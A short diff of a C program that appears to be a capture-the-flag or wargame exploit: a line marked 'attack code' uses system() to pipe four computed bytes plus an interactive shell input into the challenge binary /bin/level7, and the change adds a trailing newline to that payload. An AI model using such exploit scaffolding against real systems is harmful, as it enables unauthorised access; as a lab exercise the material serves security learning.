@@ -44,7 +44,7 @@ int main()
     printf("Changed ascii    : %c %c %c %c\n", decimal[0], decimal[1], decimal[2], decimal[3]);
 
     // attack code
-    sprintf(cmd, "(printf \"%c%c%c%c\" ; cat) | /bin/level7", decimal[0], decimal[1], decimal[2], decimal[3]);
+    sprintf(cmd, "(printf \"%c%c%c%c\n\" ; cat) | /bin/level7", decimal[0], decimal[1], decimal[2], decimal[3]);
     system(cmd);
 
     return 0;
